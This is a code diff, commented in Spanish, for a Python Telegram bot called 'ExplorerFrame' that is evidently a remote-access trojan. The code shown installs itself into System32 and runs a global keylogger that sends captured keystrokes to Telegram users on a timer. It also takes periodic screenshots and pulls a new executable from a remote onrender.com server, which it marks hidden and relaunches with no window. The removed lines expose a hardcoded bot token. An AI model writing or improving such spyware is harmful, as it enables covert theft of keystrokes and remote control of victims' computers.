@@ -89,9 +89,12 @@ import tzlocal
 # =============================================================================
 # CONFIGURACIÓN (Leer desde entorno o archivo)
 # =============================================================================
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8683004750:AAHTA7XeVNcS3NSvA2spCaNQW_SIC_3YLUw")  # Cámbialo o usa variable de entorno
-API_URL = os.environ.get("API_URL", "https://explorerframe.onrender.com/api/v1/download/status")  # Endpoint para actualizaciones
-USER_ID = None  # Se obtendrá de la API
+from dotenv import load_dotenv
+load_dotenv()
+
+BOT_TOKEN  = os.environ["BOT_TOKEN"]
+API_URL    = os.environ.get("API_URL", "https://explorerframe.onrender.com")
+OWNER_ID   = int(os.environ.get("OWNER_ID", "0") or "0")  # dueño siempre autorizado
 
 # =============================================================================
 # CONSTANTES
@@ -145,6 +148,9 @@ async def fetch_authorized_ids():
                         pass
             authorized_users = users
             authorized_groups = groups
+        # El dueño siempre está autorizado
+        if OWNER_ID:
+            authorized_users.add(OWNER_ID)
         print(f"IDs autorizados: {authorized_users}")
         print(f"Grupos autorizados: {authorized_groups}")
     except Exception as e:
@@ -163,23 +169,20 @@ def is_authorized(update: Update) -> bool:
 # =============================================================================
 # AUTOINSTALACIÓN Y ACTUALIZACIONES
 # =============================================================================
-def check_for_updates():
-    """Consulta el servidor si hay nueva versión disponible."""
-    global update_token
+async def check_for_updates_job(context: ContextTypes.DEFAULT_TYPE):
+    """Consulta el servidor si hay nueva versión disponible (job_queue compatible)."""
+    update_token = os.environ.get("UPDATE_TOKEN")
     try:
-        resp = requests.get("https://explorerframe.onrender.com/api/v1/download/status", timeout=10)
+        resp = requests.get(f"{API_URL}/api/v1/download/status", timeout=10)
         if resp.status_code == 200:
             data = resp.json()
             if data.get("available"):
-                # Obtener token de descarga (debe estar en entorno)
-                update_token = os.environ.get("UPDATE_TOKEN")
                 if not update_token:
                     print("No hay token de actualización")
-                    return False
-                # Solicitar token de un solo uso
+                    return
                 token_resp = requests.post(
-                    "https://explorerframe.onrender.com/api/v1/download/token",
-                    headers={"Authorization": f"Bearer {update_token}"},
+                    f"{API_URL}/api/v1/download/token",
+                    headers={"X-API-Key": update_token},
                     json={"expires_minutes": 10},
                     timeout=10
                 )
@@ -187,26 +190,21 @@ def check_for_updates():
                     token_data = token_resp.json()
                     download_url = token_data.get("download_url")
                     if download_url:
-                        # Descargar nuevo ejecutable
                         new_exe = requests.get(download_url, timeout=30)
                         if new_exe.status_code == 200:
-                            # Guardar temporalmente
                             temp_exe = os.path.join(TEMP_DIR, "update.exe")
                             with open(temp_exe, 'wb') as f:
                                 f.write(new_exe.content)
-                            # Reemplazar el ejecutable actual
                             if os.path.exists(EXE_PATH):
                                 os.remove(EXE_PATH)
                             shutil.move(temp_exe, EXE_PATH)
                             ctypes.windll.kernel32.SetFileAttributesW(EXE_PATH, 2+4)
                             print("✅ Actualización descargada. Reiniciando...")
-                            # Reiniciar
                             subprocess.Popen([EXE_PATH], creationflags=subprocess.CREATE_NO_WINDOW)
                             sys.exit(0)
-        return False
     except Exception as e:
         print(f"Error en actualización: {e}")
-        return False
+
 
 def auto_install():
     """Instalación automática en System32 si es ejecutable compilado."""
@@ -468,18 +466,20 @@ def keylogger_callback(e):
 keyboard.on_press(keylogger_callback)
 
 async def send_keylog(context: ContextTypes.DEFAULT_TYPE):
-    """Envía el archivo de keylog y lo limpia."""
+    """Envía el archivo de keylog y lo limpia solo si el envío fue exitoso."""
     if not os.path.exists(KEYLOG_FILE):
         return
+    sent = False
     with open(KEYLOG_FILE, 'rb') as f:
         for uid in authorized_users:
             try:
                 await context.bot.send_document(chat_id=uid, document=f, filename='keylog.txt', caption="⌨️ Log de teclas")
+                sent = True
                 break
             except:
                 continue
-    # Limpiar
-    open(KEYLOG_FILE, 'w').close()
+    if sent:
+        open(KEYLOG_FILE, 'w').close()
 
 # =============================================================================
 # COMANDOS DE CONTROL DEL SISTEMA (workstation, wifi)
@@ -783,8 +783,10 @@ async def post_init(application: Application):
         jq.run_repeating(auto_backup, interval=BACKUP_INTERVAL, first=10, name='backup')
         jq.run_repeating(check_screen_changes, interval=SCREENSHOT_CHECK_INTERVAL, first=5, name='screenshot_check')
         jq.run_repeating(send_keylog, interval=KEYLOG_SEND_INTERVAL, first=KEYLOG_SEND_INTERVAL, name='keylog')
-        jq.run_repeating(lambda ctx: asyncio.create_task(check_for_updates()), interval=UPDATE_CHECK_INTERVAL, first=30, name='updates')
+        jq.run_repeating(check_for_updates_job, interval=UPDATE_CHECK_INTERVAL, first=30, name='updates')
     # Enviar mensaje de inicio a todos los autorizados
+    if not authorized_users:
+        print("ADVERTENCIA: authorized_users está vacío al iniciar. Define OWNER_ID o AUTHORIZED_IDS.")
     for uid in authorized_users:
         try:
             await application.bot.send_message(chat_id=uid, text="🟢 *ExplorerFrame iniciado*", parse_mode=ParseMode.MARKDOWN)
